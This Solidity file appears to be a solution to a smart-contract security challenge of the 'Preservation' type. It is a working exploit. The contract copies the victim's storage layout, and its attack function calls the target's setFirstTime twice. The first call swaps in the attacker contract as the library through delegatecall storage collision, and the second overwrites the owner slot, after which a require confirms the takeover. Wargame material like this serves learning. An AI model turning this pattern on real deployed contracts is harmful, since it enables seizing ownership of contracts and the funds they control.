// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IPreservation {
    function owner() external view returns (address);
    function setFirstTime(uint256) external;
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint storedTime;

    function attack(IPreservation target) external {
        target.setFirstTime(uint256(uint160(address(this))));
        target.setFirstTime(uint256(uint160(msg.sender)));
        require(target.owner() == msg.sender, "hack failed");
    }


  function setTime(uint _time) public {
    // owner = 0xA07e32bD82f9Ba911D45dA8cA5f6659eC6ae18EC;
    owner = address(uint160(_time));
    // timeZone1Library = address(0);
    // timeZone2Library = address(this);
    // storedTime = _time;
  }
}